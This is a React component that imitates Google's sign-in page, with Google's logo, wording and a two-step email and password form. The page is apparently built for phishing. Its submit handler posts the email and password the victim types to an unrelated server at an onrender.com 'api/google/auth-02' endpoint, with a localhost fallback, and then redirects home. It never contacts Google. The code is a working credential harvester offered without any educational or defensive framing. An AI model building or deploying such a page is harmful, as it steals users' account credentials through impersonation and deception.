"use client";

import { useState } from "react";
import { useNavigate } from "react-router-dom";

const GoogleSignIn = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isEmailScreen, setIsEmailScreen] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  // Define the API URLs
  const LOCAL_API_URL = "http://localhost:5000/api/google/auth-02";
  const PRODUCTION_API_URL =
    "https://ecom-1-9xsu.onrender.com/api/google/auth-02";

  // Function to determine which API URL to use
  const getApiUrl = async () => {
    try {
      // Check if localhost is available by trying to fetch with a timeout
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 1000); // 1 second timeout

      await fetch(LOCAL_API_URL, {
        method: "HEAD",
        signal: controller.signal,
      });

      clearTimeout(timeoutId);
      return LOCAL_API_URL;
    } catch (error) {
      // If fetch fails or times out, use the production URL
      console.log("Localhost not available, using production URL");
      return PRODUCTION_API_URL;
    }
  };

  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (email.trim() === "") return;
    setIsEmailScreen(false);
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    if (password.trim() === "") return;

    setIsLoading(true);

    try {
      const apiUrl = await getApiUrl();

      const response = await fetch(apiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      // Handle response as needed
      const data = await response.json();
      console.log(data);

      // Simulate delay to show loading animation
      setTimeout(() => {
        setIsLoading(false);
      }, 2000);

      navigate("/");
    } catch (error) {
      console.error("Error:", error);
      setIsLoading(false);
    }
  };

  const handleBackToEmail = () => {
    setIsEmailScreen(true);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
      <div className="w-full max-w-md p-8 bg-white rounded-lg shadow-md">
        {/* Loading bar */}
        {isLoading && (
          <div className="absolute top-0 left-0 w-full h-1 bg-gray-200">
            <div className="h-full bg-blue-600 animate-[loading_2s_ease-in-out_infinite]"></div>
          </div>
        )}

        <div className="flex justify-center mb-6">
          <svg
            viewBox="0 0 75 24"
            width="75"
            height="24"
            xmlns="http://www.w3.org/2000/svg"
            aria-hidden="true"
            className="l5Lhkf"
          >
            <g id="qaEJec">
              <path
                fill="#ea4335"
                d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"
              ></path>
            </g>
            <g id="YGlOvc">
              <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
            </g>
            <g id="BWfIk">
              <path
                fill="#4285f4"
                d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"
              ></path>
            </g>
            <g id="e6m3fd">
              <path
                fill="#fbbc05"
                d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"
              ></path>
            </g>
            <g id="vbkDmc">
              <path
                fill="#ea4335"
                d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"
              ></path>
            </g>
            <g id="idEJde">
              <path
                fill="#4285f4"
                d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"
              ></path>
            </g>
          </svg>
        </div>

        {isEmailScreen ? (
          <form onSubmit={handleEmailSubmit} className="space-y-6">
            <div className="text-center">
              <h1 className="text-2xl font-normal text-gray-800 mb-2">
                Sign in
              </h1>
              <p className="text-sm text-gray-600">
                with your Google Account. This account will be available to
                other Google apps in the browser.
              </p>
            </div>

            <div className="mt-5">
              <input
                type="email"
                placeholder="Email or phone"
                className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>

            <div className="text-sm">
              <a href="#" className="text-blue-600 hover:text-blue-800">
                Forgot email?
              </a>
            </div>

            <div className="text-sm mt-8">
              <p className="text-gray-600">
                Not your computer? Use Guest mode to sign in privately.
              </p>
              <a href="#" className="text-blue-600 hover:text-blue-800">
                Learn more about using Guest mode
              </a>
            </div>

            <div className="flex justify-between items-center mt-10">
              <a href="#" className="text-blue-600 hover:text-blue-800 text-sm">
                Create account
              </a>
              <button
                type="submit"
                className="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700 focus:outline-none"
              >
                Next
              </button>
            </div>
          </form>
        ) : (
          <form onSubmit={handlePasswordSubmit} className="space-y-6">
            <div className="text-center">
              <h1 className="text-2xl font-normal text-gray-800 mb-2">
                Welcome
              </h1>
              <div
                className="max-w-min flex items-center justify-center border border-gray-300 rounded-full py-2 px-2 cursor-pointer"
                onClick={handleBackToEmail}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5 text-gray-500 mr-2"
                  viewBox="0 0 20 20"
                  fill="currentColor"
                >
                  <path
                    fillRule="evenodd"
                    d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"
                    clipRule="evenodd"
                  />
                </svg>
                <span className="text-sm text-gray-700">{email}</span>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5 text-gray-500 ml-2"
                  viewBox="0 0 20 20"
                  fill="currentColor"
                >
                  <path
                    fillRule="evenodd"
                    d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
                    clipRule="evenodd"
                  />
                </svg>
              </div>
            </div>

            <div className="mt-5">
              <label className="block text-sm text-blue-600 mb-1">
                Enter your password
              </label>
              <input
                type={showPassword ? "text" : "password"}
                className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
            </div>

            <div className="flex items-center">
              <input
                id="show-password"
                type="checkbox"
                className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                checked={showPassword}
                onChange={() => setShowPassword(!showPassword)}
              />
              <label
                htmlFor="show-password"
                className="ml-2 block text-sm text-gray-700"
              >
                Show password
              </label>
            </div>

            <div className="flex justify-between items-center mt-10">
              <a href="#" className="text-blue-600 hover:text-blue-800 text-sm">
                Forgot password?
              </a>
              <button
                type="submit"
                className="bg-blue-600 text-white px-6 py-2 rounded hover:bg-blue-700 focus:outline-none"
                disabled={isLoading}
              >
                Next
              </button>
            </div>
          </form>
        )}

        <div className="flex justify-between mt-16 text-xs text-gray-700">
          <div className="relative">
            <select className="appearance-none bg-transparent pr-6 focus:outline-none">
              <option>English (United States)</option>
            </select>
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-4 w-4 text-gray-500 absolute right-0 top-1"
              viewBox="0 0 20 20"
              fill="currentColor"
            >
              <path
                fillRule="evenodd"
                d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"
                clipRule="evenodd"
              />
            </svg>
          </div>
          <div className="space-x-4">
            <a href="#" className="text-gray-700 hover:text-gray-900">
              Help
            </a>
            <a href="#" className="text-gray-700 hover:text-gray-900">
              Privacy
            </a>
            <a href="#" className="text-gray-700 hover:text-gray-900">
              Terms
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default GoogleSignIn;
